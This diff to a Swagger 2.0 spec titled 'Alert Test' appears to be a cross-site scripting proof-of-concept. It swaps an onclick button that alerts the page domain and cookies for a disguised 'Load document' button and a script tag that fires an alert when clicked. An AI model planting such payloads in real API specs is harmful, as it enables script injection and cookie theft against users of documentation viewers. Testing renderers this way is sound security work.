@@ -2,11 +2,19 @@ swagger: '2.0'
 info:
   title: Alert Test
   x-notice: |
-    <div style="text-align: center; margin: 30px 0;">
-      <button style="padding: 14px 32px; font-size: 18px; background: #dc3545; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;"
-              onclick="alert('XSS from button!\n\nDomain: ' + document.domain + '\nCookie: ' + document.cookie)">
-        ⚠️ Important – Click to Verify
-      </button>
-    </div>
+    <button id="xssbtn" style="padding: 12px 28px; background: #f39c12; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin: 20px auto; display: block;">
+      Load document
+    </button>
+
+    <script>
+      setTimeout(() => {
+        let btn = document.getElementById('xssbtn');
+        if (btn) {
+          btn.onclick = () => {
+            alert("XSS payload executed!\nDomain: " + document.domain);
+          };
+        }
+      }, 800);
+    </script>
   version: 1.0.0
 paths: {}
